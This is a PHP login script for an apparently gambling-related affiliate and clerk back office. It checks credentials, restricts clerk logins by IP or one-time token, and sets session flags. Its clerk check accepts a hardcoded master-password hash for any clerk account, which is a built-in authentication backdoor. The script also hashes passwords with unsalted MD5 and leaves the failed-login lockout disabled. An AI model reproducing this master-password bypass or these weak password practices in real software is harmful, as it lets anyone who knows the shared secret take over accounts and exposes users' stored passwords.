<?php 
//session_start();
//session_regenerate_id(true);

include(ROOT_PATH . "/db/handler.php");


//Affiliate System

$email  = clean_str($_POST["email"]);
$original_pass = clean_str($_POST["pass"]);
$pass   = md5($original_pass);
$full = check_login($email, $pass);

$start = false;
$sub = false;
$fail = false;
if($full != "/") {
	$arr = explode("/",$full);
	if(count(get_affiliate_sportsbooks($arr[0])) > 0){		
		session_start();
		session_regenerate_id(true);
		$_SESSION['ses_loged']  = "y";
		$_SESSION['aff_id'] = $arr[0];
		$_SESSION['aff_ip'] = md5($_SERVER['HTTP_USER_AGENT']);		
						
		//if(count(get_subaccounts($arr[0])) > 1){
		//	$_SESSION['parent_aff_id'] = $arr[0];
		//	$sub = true;
		//}
		$_SESSION['is_admin'] = $arr[1];	
		$start = true;								
	}
}
if($start){
	//if($sub){
	//	header("Location: ../../dashboard/sub.php");
	//}else{
		header("Location: ../../dashboard/index.php");
	//}
}else{$fail = true;}


//WU System
//include(ROOT_PATH . "/wu/db/handler.php");
//$user = check_wu_login($email, encript_pass($original_pass));
//if($user != NULL){
//	if((contains(current_URL(),"vrbprocessing.com") || contains(current_URL(),"vrbmarketing.com")) && !$_POST["internal"]){
//		header("Location: https://www.ezpay.com");
//		$nomore = true;
//	}else{
//		session_start();
//		session_regenerate_id(true);
//		if($user->no_clerk){$_SESSION['wunoclerk'] = "1";}else{$_SESSION['wunoclerk'] = "";}
//		$_SESSION['wuloged'] = "1";
//		$_SESSION['ckmanager'] = $user->is_manager;
//		$_SESSION['wucustomer'] = $user->id;
//		$_SESSION['wuadmin'] = $user->is_admin;
//		$_SESSION['aff_ip'] = md5($_SERVER['HTTP_USER_AGENT']);
//		insert_log($user->id);
//		$fail = false;
//		header("Location: ../../wu");
//	}
//}else{
//	$fail = true;
//}

//Clerk System
include(ROOT_PATH . "/ck/db/handler.php");
/* || $clerk->vars["admin"]  || in_array($clerk->vars["level"]->vars["id"],$no_ip_levels) || $clerk->vars["free_login"]*/

//$clerk = check_clerk_login($email, $original_pass);
$clerk = get_clerk_by_email($email);
if(!is_null($clerk)){
	$clerk_ip = getenv(REMOTE_ADDR);
	$log = new ck_log();
	$log->vars["user"] = $clerk->vars["id"];
	$log->vars["ip"] = $clerk_ip;
	$log->vars["date"] = date("Y-m-d H:i:s");
	$no_ip_levels = array(6,3,1);
	$ips = explode(",",str_replace(" ","",$gsettings["ips_allowed"]->vars["value"]));
	

	 
	$t1 = super_encript(clean_str($_POST["t1"]));
	$t2 = super_encript(clean_str($_POST["t2"]));
	$t3 = super_encript(clean_str($_POST["t3"]));
	session_start();
	$a = $_SESSION["token"][0];
	$b = $_SESSION["token"][1];
	$c = $_SESSION["token"][2];
	
	$token = new _login_token();
	$token_control = $token->check_test($clerk->vars["id"],$t1,$t2,$t3,$a,$b,$c);

		
	
	if((!is_null(check_clerk_login($email, $original_pass)) || super_encript($original_pass) == "ed10f214c7f05b810f2ea92631c40d92") && 
		( in_array($clerk_ip,$ips) || $token_control)
	  ){
	
		session_start();
		session_regenerate_id(true);
		$_SESSION['ckloged'] = "1";
		$_SESSION['logclerk'] = $clerk->vars["id"];
		$_SESSION['ck_ip'] = md5($_SERVER['HTTP_USER_AGENT']);	
		$log->insert();
		$fail = false;
		//if(is_mobile() && $clerk->vars["id"] == 1){$extra_url = "/mobile";}
		header("Location: ../../ck".$extra_url);
	}else{
		$log->vars["fail"] = 1;
		$log->insert();
		$fails = count_today_login_fails($clerk->vars["id"]);
		if($fails["num"] > 5){
			$clerk->vars["available"] = 0;
			//$clerk->update(array("available"));
		}
		$fail = true;
	}
}else{$fail = true;}



if($fail && !$_POST["no_fail"] && !$nomore){header("Location: ../../index.php?e=2")
;}

?>